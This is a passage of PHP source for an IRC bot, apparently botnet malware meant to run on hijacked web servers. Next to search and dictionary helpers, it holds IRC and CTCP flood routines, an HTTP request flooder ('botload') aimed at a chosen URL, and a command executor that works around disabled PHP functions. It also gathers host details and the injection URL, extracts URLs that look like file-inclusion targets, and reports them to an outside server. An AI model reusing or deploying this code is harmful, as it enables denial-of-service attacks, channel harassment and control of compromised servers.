            if(strpos($cotedan,'</span></span></td>')){$cotedan=substr($cotedan,0,strpos($cotedan,'</span></span></td>'));}
            $cotedan=ltrim($cotedan);$cotedan=rtrim($cotedan);
            if(substr($cotedan,0,strlen($strsplit))==$strsplit){$cotedan=substr($cotedan,strlen($strsplit));}
            $cotedan=str_replace('</h2>','',$cotedan);
            $arredan=explode($strsplit,$cotedan);
            for ($i = 0; $i < count($arredan); $i++) {
                    $arredan[$i]=str_replace("\n","",$arredan[$i]);$arredan[$i]=str_replace("\r","",$arredan[$i]);
                    $arredan[$i]=str_replace('<br><br>','<br>',$arredan[$i]);
                    $arredan[$i]=substr($arredan[$i],strpos($arredan[$i],'</span>')+7);$arredan[$i]='<span>'.ltrim($arredan[$i]);
                    $batas=strpos($arredan[$i],"<span>")+6;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</span>");$tmpbts=substr($tmpbts,0,$batas);$kmusedan[$i]["kata"]=$tmpbts;
                    $batas=strpos($arredan[$i],'class='.chr(34).'definisi'.chr(34).'>')+17;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</p><p");$tmpbts=substr($tmpbts,0,$batas);
                    $tmpbts = str_replace("<b>","",$tmpbts);$tmpbts = str_replace("</b>","",$tmpbts);$tmpbts = str_replace("<i>","",$tmpbts);
                    $tmpbts = str_replace("</i>","",$tmpbts);$kmusedan[$i]["definisi"][strtolower($msg)]=$tmpbts;
                    $batas=strpos($arredan[$i],'class='.chr(34).'definisi_contoh'.chr(34).'>')+24;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</span></p>");$tmpbts=substr($tmpbts,0,$batas);
                    $tmpbts=str_replace("<em>","",$tmpbts);$tmpbts=str_replace("</em>","",$tmpbts);
                    $tmpbts = str_replace("<b>","",$tmpbts);$tmpbts = str_replace("</b>","",$tmpbts);$tmpbts = str_replace("<i>","",$tmpbts);
                    $tmpbts = str_replace("</i>","",$tmpbts);
                    $kmusedan[$i]["contoh"][strtolower($msg)]=$tmpbts;
                    $kmusedan[$i]["kata"][strtolower($msg)]=strtolower($ktslang);
                    $totalnya++;
            }
        }
        if($totalnya==""){$totalnya=0;}
        $kmjml[strtolower($msg)]=$totalnya;
        return $totalnya;
    }
    ##############################
    function botquery_http($query){
    $pages = $query;
    $handi = fopen ($pages, "rb");
    $konten = "";
    do {
       $baris = fread($handi, 1024);
       if (strlen($baris) == 0) { break; }
       $konten .= $baris;
    } while(true);
    fclose ($handi);
    return $konten;
    }
    function googleser($sock,$target,$qu){
    $qu=urlencode($qu);
   //$response=botquery_http("http://localhost/google/satu.html?".$qu);
     $response=$this->botquery_http("http://www.google.com/search?q=".$qu);
     $pattern = '#<h2 class=r><a href="([^"]*)" class=l>(([^<]|<[^a][^ ])*)</a></h2>#i';
     $count = preg_match_all($pattern, $response, $matches, PREG_SET_ORDER);
     if ($count == 0) {
        $this->msg($sock,$target,'15(4Google15) Your search - did not match any documents.');
        return;
    }
     $numResults = ($count < 3) ? $count : 3;
     for ($i = 0;$i < $numResults;$i++){
        $this->msg($sock,$target,'15(4Google15) '.strip_tags($this->utf8_html_entity_decode($matches[$i][2])).' - '.$matches[$i][1]);
     }
    }
    function googleimg($sock,$target,$qu){
	$qu=urlencode($qu);
	$response=$this->botquery_http("http://www.images.google.com/images?q=".$qu);
       //$response=$this->botquery_http("http://localhost/google/dua.html?".$qu);
	$pattern = '#dyn\.Img\("(.*)","(.*)","(.*)","(.*)","(.*)","(.*)","(.*)","(.*)","(.*)","(.*)","(.*)","(.*)","(.*)","(.*)","(.*)"\);#Ui';
	$count = preg_match_all($pattern, $response, $matches, PREG_SET_ORDER);
	if ($count == 0) {
	     $this->msg($sock,$target,'15(4Google15) Your search - did not match any documents.');
	     return;
	}
	$numResults = ($count < 3) ? $count : 3;
	for ($i = 0;$i < $numResults;$i++){
            $this->msg($sock,$target,'15(4Google15) '.strip_tags($this->utf8_html_entity_decode($matches[$i][4]).' ('.$matches[$i][10].' - '.$matches[$i][12].')' ));
	}
     }
    function googlecalc($sock,$target,$qu){
	$qu=urlencode($qu);
	$response=$this->botquery_http("http://www.google.com/search?q=".$qu);
	$pattern = '#<td><img src=/images/calc_img\.gif.*></td><td> </td><td nowrap><h2 class=r><font size=\+1><b>(.*)</b></h2></td>#Ui';
	$res = preg_match($pattern, $response, $match);
	if ($res === 1) {
                $this->msg($sock,$target,'15(4Google15) calculator: '.strip_tags($this->utf8_html_entity_decode($match[1])));
	} else {
		$this->msg($sock,$target,'15(4Google15) Your search - did not match any documents.');
	     return;		
	}

    }
    function googlevideo($sock,$target,$qu){
       $qu=urlencode($qu);
       $response=$this->botquery_http("http://www.video.google.com/videosearch?q=".$qu);
       $pattern = '#<div class="Title">.*<a.*>(.*)</a>.*</div><div class="Details">(.*)\-(.*)\-.*<script.*>.*</script>.*</div><div class="Snippet">(.*)</div><div class="Url">(.*)</div>#iU';
       $response = str_replace(array("\r","\n"),'',$response);
       $count = preg_match_all($pattern, $response, $matches, PREG_SET_ORDER);
       if ($count == 0) {
          $this->msg($sock,$target,'15(4Google15) Your search - did not match any documents.');
            return;
       }
       $numResults = ($count < 3) ? $count : 3;
	for ($i = 0;$i < $numResults;$i++){
            $this->msg($sock,$target,'15(4Google15) ' . trim($matches[$i][5]).' - '.trim(strip_tags($this->utf8_html_entity_decode($matches[$i][1]))).' ( '.trim($matches[$i][2]).' - '.trim($matches[$i][3]).' )');
	}
    }
    
    
    function utf8_html_entity_decode($string){
        // replace numeric entities
        $string = preg_replace('~&#x([0-9a-f]+);~ei', 'chr(hexdec("\\1"))', $string);
        $string = preg_replace('~&#([0-9]+);~e', 'chr("\\1")', $string);
        // replace literal entities
        $trans_tbl = get_html_translation_table(HTML_ENTITIES);
        $trans_tbl = array_flip($trans_tbl);
        return strtr($string, $trans_tbl);
    }
    ###############################
    function flood($sock,$target,$msg){
        global $bot,$tsu,$haltfl;
        $this->send($sock,"MODE ".$bot['nick']. " +D");
        $nicknofl=$bot['nick'];$lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$target)+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(2);
        if (ereg("#", $target)) {$this->join($sock,$target);}$katafl=$this->rnd_flod();

            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);


        sleep(3);
        $lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$dCom[1])+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(3);$katafl=$this->rnd_flod();

            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);

        
        sleep(3);
        $lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$dCom[1])+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(4);$katafl=$this->rnd_flod();
            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);;sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);

        if (ereg("#", $target)) {$this->part($sock,$target,$katafl);}
        sleep(3);$this->nick($sock,$nicknofl);sleep(1);$haltfl['time']=time();$haltfl['on']=1;
        $this->send($sock,"MODE ".$bot['nick']. " -D");
    }
    function floodctctp($sock,$target){
        global $bot,$tsu,$haltfl;
        $this->send($sock,"MODE ".$bot['nick']. " +D");
        $nicknofl=$bot['nick'];$lnickfl=rand(5,16);$nickfl="";
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(2);
        if (ereg("#", $target)) {$this->join($sock,$target);}

        $this->msg($sock,$target,'PING 5644534434538');
        $this->msg($sock,$target,'VERSION');sleep(1);
        $this->msg($sock,$target,'PING 56446334538');
        $this->msg($sock,$target,'VERSION');sleep(1);
        $this->msg($sock,$target,'PING 56434634434538');
        $this->msg($sock,$target,'VERSION');
        sleep(2);
        $lnickfl=rand(5,16);$nickfl="";
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(1);
        
        $this->msg($sock,$target,'PING 5623245434538');
        $this->msg($sock,$target,'VERSION');sleep(1);
        $this->msg($sock,$target,'PING 56444454345538');
        $this->msg($sock,$target,'VERSION');sleep(1);
        $this->msg($sock,$target,'PING 5644664534538');
        $this->msg($sock,$target,'VERSION');

        if (ereg("#", $target)) {$this->part($sock,$target,$katafl);}
        sleep(3);$this->nick($sock,$nicknofl);sleep(1);$haltfl['time']=time();$haltfl['on']=1;
        $this->send($sock,"MODE ".$bot['nick']. " -D");
    }
    
    ###############################
    function mod_help($sock,$nick){
        $this->send($sock,"MODE ".$bot['nick']. " +D");
        $lvlbot=$this->level_user($nick);
        $this->send($sock,"PING :0009927651");
        $this->msg($sock,$nick,$this->rnd_logo() .' PHP-IRC v1.4' . " - RuNNINg WiTH PHpBoT");
        $this->msg($sock,$nick,"BOT COMMAND..!");sleep (2);
        
        $this->msg($sock,$nick,"12^Login <password> 4- 2Login To Bot");sleep(1);
        $this->msg($sock,$nick,"12^Logout 4- 2Logout From Bot");sleep(2);
        
        if($lvlbot>1){
        $this->msg($sock,$nick,"12.Up 4- 2Op Bot");sleep(2);
        $this->msg($sock,$nick,"12.Down 4- 2Deop Bot");sleep(2);
        $this->msg($sock,$nick,"12.O |#chan| <nick> 4- 2Op Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.Do |#chan| <nick> 4- 2DeOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.H |#chan| <nick> 4- 2HalfOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.Dh |#chan| <nick> 4- 2DeHalfOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.V |#chan| <nick> 4- 2Voice Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.Dv |#chan| <nick> 4- 2DeVoice Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.K |#chan| <nick> |msg| 4- 2Kick Spesified Nick");sleep(1);
        $this->msg($sock,$nick,"12.Kc |#chan| <nick> |msg| 4- 2Kick Spesified Nick (ChanServ Stuf)");sleep(2);
        $this->msg($sock,$nick,"12.Kb |#chan| <nick> |msg| 4- 2KickBan Spesified Nick");sleep(2);
        $this->msg($sock,$nick,"12.B |#chan| <nick|hostmask> 4- 2Ban Nick Or Hostmask");sleep(1);
        $this->msg($sock,$nick,"12.Ub |#chan| <nick|hostmask> 4- 2UnBan Nick Or Hostmask");sleep(2);
        }
        $this->send($sock,"PING :0009927652");
        $this->msg($sock,$nick,"12.J <#chan> 4- 2Join Specified Channel");sleep (1);
        $this->msg($sock,$nick,"12.P <#chan> |msg| 4- 2Part Specified Channel");sleep (1);
        $this->msg($sock,$nick,"12.Cy <#chan> |msg| 4- 2Cycle On Specified Channel");sleep (2);
        
        if($lvlbot>2){
        $this->msg($sock,$nick,"12.N <newnick> 4- 2Change Nick");sleep(2);
        $this->msg($sock,$nick,"12.S |#chan/nick| <msg> 4- 2Msg Channel Or Person");sleep (2);
        $this->msg($sock,$nick,"12.A |#chan/nick| <text> 4- 2Action With Spesified Text");sleep(2);
        $this->msg($sock,$nick,"12.Ts <#chan/nick> |msg| 4- 2Flood!");sleep(1);
        }
        if($lvlbot>3){$this->msg($sock,$nick,"12.Q <msg> 4- 2Kill Bot");}
        
        if($lvlbot>2){
            $this->send($sock,"PING :0009927652");
        $this->msg($sock,$nick,"SYSTEM COMMAND..!");sleep(1);
        $this->msg($sock,$nick,"12.Server <server> 4- 2Push Bot To Use Spec Server");sleep(2);
        $this->msg($sock,$nick,"12.Servpass <password> 4- 2Use Spec Server Password");sleep(2);
        $this->msg($sock,$nick,"12.Vhost <host> 4- 2Changing Bot Vhost");sleep(2);
        $this->msg($sock,$nick,"12.Ident <identify> 4- 2Changing Bot Ident");sleep(1);
        $this->msg($sock,$nick,"12.Realname <realname> 4- 2Changing Bot Realname");sleep(2);
        $this->msg($sock,$nick,"12.Jump 4- 2Restarting bot also Accept Setting");sleep(1);
        }
        $this->msg($sock,$nick,"12.Chgpass <OldPass> <NewPass> 4- 2Change your pass");sleep(2);
        if($lvlbot >1){
            $this->msg($sock,$nick,"12.Adduser <NickUser> <PassUser> <LevelUser> 4- 2Add nick for my userlist");sleep(2);
            $this->msg($sock,$nick,"12.Deluser <NickUser> 4- 2Remove user from my userlist");sleep(2);
            $this->msg($sock,$nick,"12.BotNick 4- 2Nick Bot");sleep(2);
            $this->send($sock,"PING :0009927652");sleep(1);
            $this->msg($sock,$nick,"12.IdentNick <nick> <password> 4- 2Identify To Nickserv");sleep(1);
            $this->msg($sock,$nick,"12.LogoutNick 4- 2Logout From Nickserv");sleep(2);
            $this->msg($sock,$nick,"12.Userlist 4- 2Show my userlist");sleep(2);
        }
        if($lvlbot>2){
        $this->msg($sock,$nick,"12.BaseChan <#chan> 4- 2Changing my BaseChan");sleep(2);
        $this->msg($sock,$nick,"12.Chanlist <#chan> 4- 2Show my chanlist");sleep(2);
        $this->msg($sock,$nick,"12.Nicklist <#chan> 4- 2Show Nicklist on Spec Channel");sleep(1);
        $this->msg($sock,$nick,"12.Showison 4- 2Show my ison list");sleep(2);
        $this->msg($sock,$nick,"12.Chanison <#chan> 4- 2Changing my Ison Chan");sleep(2);
        $this->msg($sock,$nick,"12.Showison 4- 2Show my ison list");sleep(2);
        $this->msg($sock,$nick,"12.Settimercycle <detik> 4- 2Change my delay of AutoCycle");sleep(1);
        $this->msg($sock,$nick,"12.SetVersion <version> 4- 2Change my ctcp Version");sleep(2);
        $this->msg($sock,$nick,"12.SetFinger <finger> 4- 2Change my ctcp Finger");sleep(2);
        $this->msg($sock,$nick,"12.+/-Ping  <#chan> 4- 2Enable/Disable system Ping");sleep(2);
        $this->msg($sock,$nick,"12.+/-Version <#chan> 4- 2Enable/Disable system Version");sleep(2);
        $this->msg($sock,$nick,"12.+/-Time <#chan> 4- 2Enable/Disable system Time");sleep(1);
        $this->msg($sock,$nick,"12.+/-Finger <#chan> 4- 2Enable/Disable system Finger");sleep(2);
        $this->msg($sock,$nick,"12.+/-Spoof <#chan> 4- 2Enable/Disable system Spoof");sleep(2);
        $this->send($sock,"PING :0009927653");
        $this->msg($sock,$nick,"12.+/-Astro <#chan> 4- 2Enable/Disable system Astro");sleep(2);
        $this->msg($sock,$nick,"12.+/-Kslang <#chan> 4- 2Enable/Disable system Kamus Slang");sleep(1);
        $this->msg($sock,$nick,"12.+/-Bom <#chan> 4- 2Enable/Disable system Bom");sleep(2);
        $this->msg($sock,$nick,"12.+/-Dns <#chan> 4- 2Enable/Disable system Dns");sleep(1);
        $this->msg($sock,$nick,"12.+/-Ison <#chan> 4- 2Enable/Disable system Ison");sleep(2);
        $this->msg($sock,$nick,"12.+/-Greet <#chan> 4- 2Enable/Disable system Greet");sleep(1);
        $this->msg($sock,$nick,"12.+/-AutoCycle <#chan> 4- 2Enable/Disable system AutoCycle");sleep(2);
        $this->msg($sock,$nick,"12.+/-AutoJoin 4- 2Enable/Disable system AutoJoin when kick");sleep(2);
        $this->msg($sock,$nick,"12.+/-AutoAway 4- 2Enable/Disable system Away when idle");sleep(2);
        $this->msg($sock,$nick,"12.+/-ListIson <nick> 4- 2Add/Remove Ison List");sleep(2);
        $this->msg($sock,$nick,"12.+/-ListGreet <nick> <pesan greet> 4- 2Add/Remove Greet List");sleep(1);
        }
        $this->msg($sock,$nick,"For more help ask my Owner Or Kirim email ke admin@alitacrew.co.cc");sleep(2);
        $this->msg($sock,$nick,"0,1M1,0A0,1Z1,0A0,1C1,0R0,1E1,0W0,1- Add Fs Me Boz ipays[at]ipays[dot]co[dot]cc");sleep(1);
        $this->send($sock,"MODE ".$bot['nick']. " -D");
    }
    ###############################
function cek_ym($id){
	$DataPOST="isOnline=1&isAvatar=1&user=" . urlencode($id);;
$DataSEND="POST http://www.invisible-scanner.com/ans2.php HTTP/1.0
Host: www.invisible-scanner.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6
Accept: text/html
Accept-Language: en-us,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: ".strlen($DataPOST)."\r\n\r\n".$DataPOST;
//$this->pingserv($sock);
	$fpym = fsockopen("www.invisible-scanner.com","80", &$err_num, &$err_msg, 20);
	if($fpym) {
	fwrite($fpym, $DataSEND);
	while (!feof($fpym)) {
		$kontenym .= fgets($fpym, 8192);
	}
	fclose($fpym);
	}
	if (strpos($kontenym,"res[2]=")){
		$kontenym=substr($kontenym,strpos($kontenym,"\r\n\r\n")+strlen("\r\n\r\n"));
		switch (substr($kontenym,0,8)){
		case "res[2]=2":
$st= "Online";
			break;
		case "res[2]=3":
$st= "Invisible";
			break;
		case "res[2]=4":
$st= "Offline";
			break;
		}
	}
	else {
	$st="Tak diketahui";
	}
	return $st;
}
	
	function caritarget($txt){
		$txt =" ".$txt;$lhttp=strpos($txt,"http://");
		if ($lhttp < 1 ){ return 0;}
		$txt=substr($txt,$lhttp);
		if (strpos($txt,'?') < 7){ return 0;}
		if (strpos($txt,'=') < 7){ return 0;}
		if (strpos($txt,'.') < 7){ return 0;}	
		$s=strrpos($txt, "=");$txt=substr($txt,0,$s+1);
		return $txt;
	}
	function savex($onoffx,$target){
		$nsock = @fsockopen("copilot.awardspace.com","80",$enum,$estr,20);
		if ($nsock) {
			$target=urlencode($target);
			$out = "GET http://copilot.awardspace.com/copilot.php?cmd=tambah&type=$onoffx&target=$target HTTP/1.1\r\n".
			"Host: copilot.awardspace.com\r\n".
			"Accept: */*\r\n".
			"User-Agent: Mozilla/5.0\r\n".
			"Connection: Close\r\n\r\n";
			fputs($nsock,$out);
			fclose($nsock);
		}
	}

	 /*-------------[ alita Fx29PHPBot - Mod By ipays ]---------------*/
	function httpquery($url,$timeout) {
		$aurl = explode("/",$url);$host = $aurl[2];
		$ruri = "/".join("/",array_slice($aurl,3));
		$port = 80;$rez = "";
		$sock = fsockopen($host,$port,$errno,$errstr,$timeout);
		if ($sock) {
			$out = "GET $ruri HTTP/1.1\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\nConnection: Close\r\n\r\n";
			fputs($sock,$out);
			while (!feof($sock)) { $rez .= @fgets($sock, 512); }
				fclose($sock);
		}
		return $rez;
	}
	function portcheck($host,$port,$timeout) {
		$nsock = @fsockopen($host,$port,$enum,$estr,$timeout);
		if (!$nsock) {
			if ($enum == 10060) { $rez = "4Timed out!"; }
			else { $rez = "4Ditolak!";}
		}
		else { $rez = "12OK!"; fclose($nsock); }
		return $rez;
	}
	function botload($count,$url) {
		if ( $url == "CHILD" ) {
			$host = $_SERVER["HTTP_HOST"];$ruri = $_SERVER["REQUEST_URI"];
		}
		else {
			if (!is_numeric($count)) {
				return "Format salah! gunakan: .loadbot <num> <url>";
			}
			$aurl = explode("/",$url);
			$host = $aurl[2];
			$ruri = "/".join("/",array_slice($aurl,3));
		}
		$port = "80";$fail = 0;
		for ($i=1;$i<=$count;$i++) {
			$nsock = @fsockopen($host,$port,$enum,$estr,10);
			if (!$nsock) { $fail++; }
			else {
				$out = "GET $ruri HTTP/1.1\r\n".
					"Host: $host\r\n".
					"Accept: */*\r\n".
					"User-Agent: Mozilla/5.0\r\n".
					"Connection: Close\r\n\r\n";
				fputs($nsock,$out);
				fclose($nsock);
				$fail = ($fail > 0) ? $fail� : 0;
			}
		}
		$count = $count - $fail;
		$fail = ($fail > 0) ? '('.$fail.' Failed)': "";
		return "(".$count.' Loaded) '.$fail.' '.$host;
	}
	function botinfo($sock,$to,$info) {
		$info = chop($info,'');
		$info = strtolower($info);
		$mem = (function_exists("memory_get_usage"))? $this->view_size(@memory_get_usage()) : "-";
		$safe = $this->safemode() ? "12ON" : "4OFF";
		$arrinfo = array(
			"safe" => 'Safemode '.$safe.' 14Pid12 '.@getmypid(),
			"uname" => 'Os12 '.php_uname(),
			"server" => 'ServName12 '.$_SERVER["SERVER_NAME"].'14 Ip12 '.$_SERVER["SERVER_ADDR"].' ('.$_SERVER["SERVER_PORT"].')',
			"ip" => 'IPList12 '.$this->iplist($_SERVER["SERVER_NAME"]),
			"user" => 'User12 '.@get_current_user().'14 Uid12 '.@getmyuid().'14 Gid12 '.@getmygid(),
			"soft" => 'Soft12 '.$_SERVER["SERVER_SOFTWARE"],
			"vhost" => 'Vhost ['.count($this->vhost()).']12 '.$this->vhost(", "),
			"mem" => 'Memory12 '.$mem.' 14Limit12 '.@ini_get("memory_limit").' 14TimeLimit12 '.@ini_get("max_execution_time"),
			"remote" => 'Remote12 '.$_SERVER["REMOTE_ADDR"].' ('.$_SERVER["REMOTE_PORT"].')',
			"proto" => 'Gateway12 '.$_SERVER["GATEWAY_INTERFACE"].' 14Protocol:12 '.$_SERVER["SERVER_PROTOCOL"],
			"sadmin" => 'Admin12 '.$_SERVER["SERVER_ADMIN"],
			"mail" => 'SMTP12 '.@ini_get("SMTP").' ('.@ini_get("smtp_port").') 14Path12 '.@ini_get("sendmail_path").' 14From12 '.@ini_get("sendmail_from"),
			"docroot" => 'DocRoot12 '.$_SERVER["DOCUMENT_ROOT"],
			"script" => 'File12 '.$_SERVER["SCRIPT_FILENAME"].' 14PHPSelf12 '.$_SERVER["PHP_SELF"],
			"bug" => 'Bug12 http://'.$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"],
		);
		$this->notice($sock,$to,chr(1) . 'INFO '.$arrinfo[$info].chr(1));
	}
	function view_size($size) {
		if (!is_numeric($size)) { return FALSE; }
		else { if ( $size >= 1073741824 ) { $size = round($size/1073741824*100)/100 ." GB"; }
			elseif ( $size >= 1048576 ) { $size = round($size/1048576*100)/100 ." MB"; }
			elseif ( $size >= 1024 ) { $size = round($size/1024*100)/100 ." KB"; }
			else { $size = $size . " B"; }
			return $size;
		}
	}
	function vhost($sep = NULL) {
		$rez = $this->fx29exec("/sbin/ifconfig | grep inet");
		$pattern = "#inet addr:(.*?) Bcast#";
		$count = preg_match_all($pattern, $rez, $matches, PREG_SET_ORDER);
		if ( $count == 0 ) { $arrez = array(); }
		for ( $i = 0; $i < $count; $i++ ) { $arrez[] = $matches[$i][1]; }
		if ( $sep ) { return join($sep,$arrez); }
		else { return $arrez; }
	}
	function fx29exec($cmd) {
		if ($this->enabled("popen")) { if ( is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { @$rez .= fread($h, 2096); } pclose($h); } }
		elseif ($this->enabled("passthru")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
		elseif ($this->enabled("system")) { @ob_start(); system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
		elseif ($this->enabled("exec")) { exec($cmd,$o); $rez = join("\r\n",$o); }
		elseif ($this->enabled("shell_exec")) { $rez = shell_exec($cmd); }
		return $rez;
	}
	function iplist($host) {$rez = gethostbynamel($host);$rez = implode(", ",$rez);if ( empty($rez) ) { $rez = "None"; }return $rez;}
	function enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,$this->getdisfunc())) ? TRUE : FALSE; }
	function safemode() { return (@ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode")) ) ? TRUE : FALSE; }
	function getdisfunc() { $rez = explode(",",@ini_get("disable_functions")); return (!empty($rez))?$rez:array(); }
	/*-------------[-----------------------------------]---------------*/
}
################ [ END CLASS IRC BOT ] ###################
